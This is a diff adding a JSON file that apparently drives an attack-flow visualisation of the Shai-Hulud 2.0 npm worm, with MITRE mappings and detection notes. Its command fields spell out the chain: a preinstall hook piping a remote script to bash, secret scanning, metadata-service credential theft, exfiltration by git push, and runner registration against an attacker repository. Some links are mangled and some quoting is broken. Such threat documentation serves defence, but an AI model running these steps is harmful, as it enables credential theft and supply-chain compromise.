@@ -1,0 +1,463 @@
+{
+    "title": "Shai-Hulud 2.0 NPM Supply Chain Worm",
+    "description": "Self-propagating malware targeting npm packages that harvests cloud credentials, establishes persistence via GitHub Runners, and wipes systems upon failure.",
+    "shortDescription": "Self-propagating npm worm harvesting cloud credentials",
+    "tags": [
+        "Supply_Chain",
+        "NPM",
+        "Credential_Dumping",
+        "Worm",
+        "CI_CD",
+        "Persistence",
+        "Cloud",
+        "Exfiltration",
+        "JavaScript"
+    ],
+    "version": "3.0",
+    "viewport": {
+        "zoom": 1.1,
+        "pan": {
+            "x": 150,
+            "y": 50
+        }
+    },
+    "metadata": {
+        "descriptionHtml": "<p><strong>Shai-Hulud 2.0</strong> is a sophisticated, self-propagating worm that exploits the <span style='color:#ef4444;font-weight:bold;'>npm supply chain</span>. By compromising maintainer accounts, attackers publish trojanized packages containing a malicious <code>preinstall</code> script. This script covertly installs the <strong>Bun runtime</strong> to execute a complex payload that:</p><ol><li>Harvests secrets using <span style='color:#ef4444;font-weight:bold;'>TruffleHog</span> and cloud metadata queries.</li><li>Exfiltrates data to attacker-controlled GitHub repositories.</li><li>Establishes persistence by registering a self-hosted <strong>GitHub Actions Runner</strong>.</li><li>Propagates itself by trojanizing other packages owned by the victim.</li><li>Destroys system data (wiping <code>~</code>) if exfiltration fails.</li></ol>",
+        "commandsBlock": "# Step 1: Malicious preinstall hook (setup_bun.js)\n$ curl -fsSL [https://bun.sh/install](https://bun.sh/install) | bash\n\n# Step 2: Secret Harvesting (bun_environment.js)\n$ pip install truffleHog\n$ trufflehog filesystem /home --max_depth 4\n$ curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/](https://www.google.com/search?q=http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n\n# Step 3: Exfiltration to GitHub\n$ gh api --method POST /user/repos -f name="" -f description="Sha1-Hulud..."\n$ git push origin main\n\n# Step 4: Persistence (GitHub Runner)\n$ ./config.sh --url [https://github.com/attacker/repo](https://github.com/attacker/repo) --name SHA1HULUD --unattended\n$ nohup ./run.sh &",
+        "extraInfo": [
+            "Microsoft Security Blog - Shai-Hulud 2.0 Detection Guidance",
+            "Datadog Security Labs - Analysis of the npm worm",
+            "MITRE T1195.002 - Compromise Software Supply Chain",
+            "MITRE T1552.005 - Cloud Instance Metadata API",
+            "TruffleHog - [https://github.com/trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog)"
+        ],
+        "prerequisites": [
+            "Target running 'npm install' on package with malicious hook",
+            "Scripts enabled (npm_config_ignore_scripts=false)",
+            "Outbound internet access to GitHub, npm, and bun.sh",
+            "Stored credentials (~/.aws, ~/.npmrc, environment variables)"
+        ],
+        "attackerGains": [
+            "Cloud credentials (AWS, GCP, Azure)",
+            "NPM registry tokens for propagation",
+            "GitHub Personal Access Tokens (PATs)",
+            "Persistent command execution via GitHub Runner"
+        ],
+        "detectionNotes": [
+            "Process execution of 'bun' or 'setup_bun.js' in npm folders",
+            "Network traffic to 169.254.169.254 (IMDS) from non-cloud tools",
+            "New GitHub repositories with 18-character random names",
+            "Registration of self-hosted runners named 'SHA1HULUD'"
+        ],
+        "mitreCategories": [
+            "T1195.002",
+            "T1552.001",
+            "T1567.001",
+            "T1059.007",
+            "T1584.006",
+            "T1485"
+        ]
+    },
+    "entities": [
+        {
+            "id": "attacker",
+            "type": "node",
+            "label": "Threat Actor",
+            "icon": "IconAttacker",
+            "position": {
+                "x": 600,
+                "y": 50
+            }
+        },
+        {
+            "id": "internet_zone",
+            "type": "container",
+            "label": "Internet / Public Infrastructure",
+            "icon": "IconCloud",
+            "position": {
+                "x": 50,
+                "y": 50
+            },
+            "width": 500,
+            "height": 200,
+            "style": "dashed_border",
+            "members": [
+                "npm_registry",
+                "github_platform",
+                "bun_cdn"
+            ]
+        },
+        {
+            "id": "npm_registry",
+            "type": "node",
+            "label": "NPM Registry",
+            "icon": "IconNpm",
+            "position": {
+                "x": 100,
+                "y": 120
+            }
+        },
+        {
+            "id": "github_platform",
+            "type": "node",
+            "label": "GitHub API/Repos",
+            "icon": "IconGitHub",
+            "position": {
+                "x": 280,
+                "y": 120
+            }
+        },
+        {
+            "id": "bun_cdn",
+            "type": "node",
+            "label": "bun.sh",
+            "icon": "IconServer",
+            "position": {
+                "x": 450,
+                "y": 120
+            }
+        },
+        {
+            "id": "victim_environment",
+            "type": "container",
+            "label": "Victim Environment (Workstation/CI)",
+            "icon": "IconWorkstation",
+            "position": {
+                "x": 50,
+                "y": 300
+            },
+            "width": 600,
+            "height": 450,
+            "style": "dashed_border",
+            "members": [
+                "user_terminal",
+                "malware_installer",
+                "bun_payload",
+                "credential_store",
+                "imds_endpoint",
+                "npmrc_file",
+                "github_runner"
+            ]
+        },
+        {
+            "id": "user_terminal",
+            "type": "node",
+            "label": "Terminal / CI Runner",
+            "icon": "IconTerminal",
+            "position": {
+                "x": 120,
+                "y": 360
+            }
+        },
+        {
+            "id": "malware_installer",
+            "type": "node",
+            "label": "setup_bun.js",
+            "icon": "IconInfectedCode",
+            "position": {
+                "x": 300,
+                "y": 360
+            }
+        },
+        {
+            "id": "bun_payload",
+            "type": "node",
+            "label": "bun_environment.js",
+            "icon": "IconInfectedProcess",
+            "position": {
+                "x": 300,
+                "y": 480
+            }
+        },
+        {
+            "id": "credential_store",
+            "type": "node",
+            "label": "Filesystem Secrets",
+            "icon": "IconCredential",
+            "position": {
+                "x": 120,
+                "y": 480
+            }
+        },
+        {
+            "id": "npmrc_file",
+            "type": "node",
+            "label": "~/.npmrc",
+            "icon": "IconToken",
+            "position": {
+                "x": 120,
+                "y": 580
+            }
+        },
+        {
+            "id": "imds_endpoint",
+            "type": "node",
+            "label": "Cloud Metadata (169.254...)",
+            "icon": "IconCloud",
+            "position": {
+                "x": 500,
+                "y": 480
+            }
+        },
+        {
+            "id": "github_runner",
+            "type": "node",
+            "label": "Runner 'SHA1HULUD'",
+            "icon": "IconInfectedService",
+            "position": {
+                "x": 480,
+                "y": 600
+            }
+        }
+    ],
+    "visibility": {
+        "attacker": {
+            "start": 0,
+            "end": 100
+        },
+        "internet_zone": {
+            "start": 0,
+            "end": 100
+        },
+        "npm_registry": {
+            "start": 0,
+            "end": 100
+        },
+        "github_platform": {
+            "start": 0,
+            "end": 100
+        },
+        "bun_cdn": {
+            "start": 0,
+            "end": 100
+        },
+        "victim_environment": {
+            "start": 0,
+            "end": 100
+        },
+        "user_terminal": {
+            "start": 0,
+            "end": 100
+        },
+        "credential_store": {
+            "start": 0,
+            "end": 100
+        },
+        "npmrc_file": {
+            "start": 0,
+            "end": 100
+        },
+        "imds_endpoint": {
+            "start": 0,
+            "end": 100
+        },
+        "malware_installer": {
+            "start": 4,
+            "end": 100
+        },
+        "bun_payload": {
+            "start": 6,
+            "end": 100
+        },
+        "github_runner": {
+            "start": 13,
+            "end": 100
+        }
+    },
+    "steps": [
+        {
+            "id": 1,
+            "type": "edge",
+            "name": "Publish poisoned package",
+            "from": "attacker",
+            "to": "npm_registry",
+            "icon": "IconNpm",
+            "tooltip": "Attacker uses compromised maintainer account to publish package with malicious preinstall hook",
+            "mitre": {
+                "id": "T1195.002",
+                "tactic": "Initial Access",
+                "technique": "Compromise Software Supply Chain"
+            },
+            "cli": "npm publish malicious-package@1.0.1"
+        },
+        {
+            "id": 2,
+            "type": "edge",
+            "name": "npm install (Request)",
+            "from": "user_terminal",
+            "to": "npm_registry",
+            "icon": "IconNpm",
+            "tooltip": "Victim installs the infected package",
+            "cli": "npm install malicious-package",
+            "mitre": {
+                "id": "T1204.002",
+                "tactic": "Execution",
+                "technique": "User Execution: Malicious File"
+            }
+        },
+        {
+            "id": 3,
+            "type": "edge",
+            "name": "Download package",
+            "from": "npm_registry",
+            "to": "user_terminal",
+            "icon": "IconMalware",
+            "tooltip": "Package downloaded; npm checks for lifecycle scripts"
+        },
+        {
+            "id": 4,
+            "type": "edge",
+            "name": "Trigger preinstall hook",
+            "from": "user_terminal",
+            "to": "malware_installer",
+            "icon": "IconInfectedCode",
+            "tooltip": "npm executes setup_bun.js automatically",
+            "mitre": {
+                "id": "T1059.007",
+                "tactic": "Execution",
+                "technique": "Command and Scripting Interpreter: JavaScript"
+            }
+        },
+        {
+            "id": 5,
+            "type": "edge",
+            "name": "Download Bun runtime",
+            "from": "bun_cdn",
+            "to": "malware_installer",
+            "icon": "IconCode",
+            "tooltip": "Malware downloads Bun runtime to execute obfuscated payload",
+            "cli": "curl -fsSL [https://bun.sh/install](https://bun.sh/install) | bash"
+        },
+        {
+            "id": 6,
+            "type": "edge",
+            "name": "Execute main payload",
+            "from": "malware_installer",
+            "to": "bun_payload",
+            "icon": "IconInfectedProcess",
+            "tooltip": "setup_bun.js spawns bun_environment.js using the fresh Bun runtime",
+            "cli": "~/.bun/bin/bun bun_environment.js"
+        },
+        {
+            "id": 7,
+            "type": "edge",
+            "name": "Harvest local secrets",
+            "from": "bun_payload",
+            "to": "credential_store",
+            "icon": "IconSearch",
+            "tooltip": "Payload runs TruffleHog to find secrets in filesystem and env vars",
+            "mitre": {
+                "id": "T1552.001",
+                "tactic": "Credential Access",
+                "technique": "Unsecured Credentials: Credentials In Files"
+            },
+            "cli": "trufflehog filesystem /home --max_depth 4"
+        },
+        {
+            "id": 8,
+            "type": "edge",
+            "name": "Query Cloud Metadata",
+            "from": "bun_payload",
+            "to": "imds_endpoint",
+            "icon": "IconCloud",
+            "tooltip": "Malware requests credentials from Cloud Instance Metadata Service",
+            "cli": "curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/](https://www.google.com/search?q=http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
+            "mitre": {
+                "id": "T1552.005",
+                "tactic": "Credential Access",
+                "technique": "Cloud Instance Metadata API"
+            }
+        },
+        {
+            "id": 9,
+            "type": "edge",
+            "name": "Return IAM Credentials",
+            "from": "imds_endpoint",
+            "to": "bun_payload",
+            "icon": "IconKey",
+            "tooltip": "Metadata service returns temporary AWS/GCP/Azure credentials"
+        },
+        {
+            "id": 10,
+            "type": "edge",
+            "name": "Steal NPM Token",
+            "from": "bun_payload",
+            "to": "npmrc_file",
+            "icon": "IconSearch",
+            "tooltip": "Reads ~/.npmrc to find auth tokens for worm propagation",
+            "mitre": {
+                "id": "T1552.001",
+                "tactic": "Credential Access",
+                "technique": "Unsecured Credentials: Credentials In Files"
+            }
+        },
+        {
+            "id": 11,
+            "type": "edge",
+            "name": "Exfiltrate to GitHub",
+            "from": "bun_payload",
+            "to": "github_platform",
+            "icon": "IconStolenCredential",
+            "tooltip": "Creates a public repo with random name and pushes harvested secrets",
+            "cli": "gh api /user/repos -f name="<random18>" && git push",
+            "mitre": {
+                "id": "T1567.001",
+                "tactic": "Exfiltration",
+                "technique": "Exfiltration to Code Repository"
+            }
+        },
+        {
+            "id": 12,
+            "type": "edge",
+            "name": "Retrieve Stolen Data",
+            "from": "github_platform",
+            "to": "attacker",
+            "icon": "IconStolenCredential",
+            "tooltip": "Attacker accesses the public repository to collect credentials"
+        },
+        {
+            "id": 13,
+            "type": "edge",
+            "name": "Register GitHub Runner",
+            "from": "bun_payload",
+            "to": "github_runner",
+            "icon": "IconInfectedService",
+            "tooltip": "Malware installs and registers a self-hosted runner named 'SHA1HULUD'",
+            "cli": "./config.sh --name SHA1HULUD --unattended",
+            "mitre": {
+                "id": "T1584.006",
+                "tactic": "Resource Development",
+                "technique": "Compromise Infrastructure: Web Services"
+            }
+        },
+        {
+            "id": 14,
+            "type": "edge",
+            "name": "C2 Connection",
+            "from": "github_runner",
+            "to": "github_platform",
+            "icon": "IconC2",
+            "tooltip": "Runner connects to attacker's repo, awaiting workflow jobs",
+            "mitre": {
+                "id": "T1071.001",
+                "tactic": "Command and Control",
+                "technique": "Web Protocols"
+            }
+        },
+        {
+            "id": 15,
+            "type": "edge",
+            "name": "Worm Propagation",
+            "from": "bun_payload",
+            "to": "npm_registry",
+            "icon": "IconInfectedPackage",
+            "tooltip": "Uses stolen npm token to publish infected versions of victim's own packages",
+            "cli": "npm publish --access public",
+            "mitre": {
+                "id": "T1195.002",
+                "tactic": "Initial Access",
+                "technique": "Compromise Software Supply Chain"
+            }
+        }
+    ]
+}
